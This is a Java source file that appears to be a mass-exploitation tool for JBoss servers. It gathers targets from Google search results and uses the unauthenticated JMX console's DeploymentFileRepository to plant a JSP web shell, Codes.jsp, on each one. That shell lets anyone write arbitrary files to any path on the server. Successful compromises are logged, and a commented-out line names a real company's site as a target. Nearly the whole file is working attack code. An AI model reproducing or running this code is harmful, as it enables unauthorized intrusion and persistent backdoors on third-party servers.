package cc.co.geniusman.http;

import java.io.IOException;
import java.net.URLEncoder;
import java.util.Map;
import java.util.Map.Entry;

import javax.xml.ws.http.HTTPException;

import org.apache.commons.httpclient.HttpClient;
import org.apache.commons.httpclient.methods.PostMethod;
import org.apache.commons.httpclient.methods.StringRequestEntity;
import org.apache.commons.httpclient.params.HttpClientParams;
import org.apache.log4j.Logger;

public class JbossTest {
	private static Logger log = Logger.getLogger(JbossTest.class);

	/**
	 * @param args
	 */
	public static void main(String[] args) throws Throwable {

		Map<String, HostAndPort> resultList = ParserGoogleSearch.getResult();

		for (Entry<String, HostAndPort> entry : resultList.entrySet()) {
			HostAndPort result = entry.getValue();
			try {
				jbossTest(result.toString());
			} catch (Exception ex) {
				continue;
			}
		}
	}

	private static void jbossTest(String httpHost) throws Throwable {
		// TODO Auto-generated method stub
		// final String port = "80";
		// final String host = "http://www.macsteel.co.za";
		final String jspName = "Codes";
		final String blind = URLEncoder.encode(getInfos(), "utf-8");

		StringBuffer url = new StringBuffer();

		url.append(httpHost);
		url.append("/jmx-console/HtmlAdaptor?" + "action=invokeOp"
				+ "&name=jboss.admin%3Aservice%3DDeploymentFileRepository"
				+ "&methodIndex=5" + "&arg0=console-mgr.sar/web-console.war/");
		url.append("&arg1=");
		url.append(jspName);
		url.append("&arg2=.jsp");
		url.append("&arg3=");
		url.append(blind);
		url.append("&arg4=True");

		int ret = post(url.toString(), "");
		if (ret == 200) {
			String targetUrl = httpHost + "/web-console/Codes.jsp";
			if (post(targetUrl, "") == 200) {
				log.info(targetUrl);
			}
		}
	}

	public static int post(String url, String body) throws IOException,
			HTTPException {
		int retCode = -1;
		HttpClientParams hcp = new HttpClientParams();
		hcp.setSoTimeout(5000);
		HttpClient client = new HttpClient(hcp);
		PostMethod post = new PostMethod(url);
		try {
			if (body != null) {
				StringRequestEntity e = new StringRequestEntity(body, null,
						null);
				post.setRequestHeader("Content-type", "text/xml");
				post.setRequestEntity(e);
				retCode = client.executeMethod(post);
			}
		} finally {
			if (post != null) {
				post.releaseConnection();
			}
		}
		return retCode;
	}

	public static String getInfos() {
		String aa = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>"
				+ "<jsp:directive.page import=\"java.io.File\"/>"
				+ "<jsp:directive.page import=\"java.io.OutputStream\"/>"
				+ "<jsp:directive.page import=\"java.io.FileOutputStream\"/>"
				+ "<html>"
				+ "<head>"
				+ "<title>code</title>"
				+ "<meta http-equiv=\"keywords\" content=\"code\">"
				+ "<meta http-equiv=\"description\" content=\"code\">"
				+ "</head>"
				+ "<%"
				+ "int i=0;"
				+ "String method=request.getParameter(\"act\");"
				+ "if(method!=null&&method.equals(\"up\")){"
				+ "String url=request.getParameter(\"url\");"
				+ "String text=request.getParameter(\"text\");"
				+ "File f=new File(url);"
				+ "if(f.exists()){"
				+ "f.delete();"
				+ "}"
				+ "try{"
				+ "OutputStream o=new FileOutputStream(f);"
				+ "o.write(text.getBytes());"
				+ "o.close();"
				+ "}catch(Exception e){"
				+ "i++;"
				+ "%>"
				+ "upload unsuccessful"
				+ "<%"
				+ "}"
				+ "}"
				+ "if(i==0){"
				+ "%>"
				+ "upload successful"
				+ "<%"
				+ "}"
				+ "%>"
				+ "<body>"
				+ "<form action='?act=up' method='post'>"
				+ "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url\"><br>"
				+ "<textarea rows=\"20\" cols=\"80\" name=\"text\">code</textarea><br>"
				+ "<input type=\"submit\" value=\"up\" name=\"text\"/>"
				+ "</form>" + "</body>" + "</html>";
		return aa;
	}

}
